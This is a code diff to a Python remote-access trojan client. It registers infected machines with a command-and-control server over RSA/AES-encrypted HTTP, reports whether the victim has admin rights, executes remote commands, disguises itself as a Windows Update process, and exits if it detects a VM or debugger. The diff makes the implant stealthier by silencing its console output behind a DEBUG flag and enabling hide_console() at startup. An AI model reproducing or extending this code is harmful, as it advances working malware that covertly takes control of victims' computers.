@@ -31,6 +31,7 @@ MUTEX_NAME = "Global\\WindowsUpdateMutex"  # Prevent multiple instances
 LOCK_FILE = os.path.join(os.getenv("TEMP", "."), ".wupdate.lock")  # Lockfile fallback
 XOR_KEY = 0x5A  # Simple XOR key for payload obfuscation
 ANTI_VM = False  # Set to False if you're testing in a VM
+DEBUG = False  # Set to True for console debug output
 # ================
 
 # === STEALTH: Realistic User-Agent Pool ===
@@ -60,11 +61,11 @@ def fetch_server_rsa_pub():
     global server_rsa_pub_key
     try:
         url = f"{C2_DOMAIN}/rsa_pub"
-        print(f"[*] Fetching RSA public key from {url}...")
+        if DEBUG: print(f"[*] Fetching RSA public key from {url}...")
         resp = requests.get(url, timeout=10)
         if resp.status_code == 200 and resp.text.strip():
             server_rsa_pub_key = RSA.import_key(resp.text)
-            print("[+] RSA public key fetched successfully.")
+            if DEBUG: print("[+] RSA public key fetched successfully.")
             return True
         else:
             print(f"[!] Failed to fetch RSA key. Status: {resp.status_code}")
@@ -109,7 +110,7 @@ def get_session():
 
 def c2_post(endpoint, data, timeout=10):
     """Send AES-encrypted POST (with RSA-encrypted session key for registration or direct AES for subsequent requests)"""
-    print(f"[*] Sending POST to {endpoint}...")
+    if DEBUG: print(f"[*] Sending POST to {endpoint}...")
     global server_rsa_pub_key
     json_data = json.dumps(data)
     
@@ -132,9 +133,9 @@ def c2_post(endpoint, data, timeout=10):
                 headers={"Content-Type": "application/json"},
                 timeout=timeout
             )
-            print(f"[*] Response from {endpoint}: {resp.status_code}")
+            if DEBUG: print(f"[*] Response from {endpoint}: {resp.status_code}")
             if resp.status_code != 200:
-                print(f"[!] Server Error Detail: {resp.text}")
+                if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
             return resp
             
     # Standard AES-encrypted request — pass client_id as query param for server lookup
@@ -149,14 +150,14 @@ def c2_post(endpoint, data, timeout=10):
         params=params,
         timeout=timeout
     )
-    print(f"[*] Response from {endpoint}: {resp.status_code}")
+    if DEBUG: print(f"[*] Response from {endpoint}: {resp.status_code}")
     if resp.status_code != 200:
-        print(f"[!] Server Error Detail: {resp.text}")
+        if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
     return resp
 
 def c2_get(endpoint, params=None, timeout=10):
     """Send GET to C2 and decrypt AES response. Falls back to plain JSON if server has no session key (e.g. after restart)."""
-    print(f"[*] Polling {endpoint}...")
+    if DEBUG: print(f"[*] Polling {endpoint}...")
     resp = get_session().get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
     if resp.status_code == 200 and resp.text.strip():
         try:
@@ -877,7 +878,7 @@ def preview_file(path):
 
 def execute_command(cmd):
     """Execute a command and return the result"""
-    print(f"[*] Executing command: {cmd}")
+    if DEBUG: print(f"[*] Executing command: {cmd}")
     global current_dir, POLLING_DELAY
 
     try:
@@ -1077,7 +1078,7 @@ def execute_command(cmd):
 
 def connect_c2():
     """Main C2 connection loop with encrypted comms, jitter, and exponential backoff"""
-    print("[*] Starting C2 connection loop...")
+    if DEBUG: print("[*] Starting C2 connection loop...")
     global client_id
     backoff = RETRY_BACKOFF_MIN
 
@@ -1125,13 +1126,13 @@ def connect_c2():
                 "admin": is_admin,
                 "client_id": client_id
             }
-            print(f"[*] Registering client: {client_id}")
+            if DEBUG: print(f"[*] Registering client: {client_id}")
             resp = c2_post("/register", session_info)
             if resp and resp.status_code == 200:
-                print("[+] Registered successfully.")
+                if DEBUG: print("[+] Registered successfully.")
             else:
                 status = resp.status_code if resp else "No Response"
-                print(f"[-] Registration failed with status: {status}")
+                if DEBUG: print(f"[-] Registration failed with status: {status}")
                 time.sleep(RETRY_DELAY)
                 continue # Try registration again
 
@@ -1176,8 +1177,7 @@ def connect_c2():
 
 
 if __name__ == "__main__":
-    # hide_console()
-    print("[*] Client started. Debug mode active.")
+    hide_console()
     check_single_instance()
 
     # Anti-analysis: exit silently if VM/sandbox or debugger detected
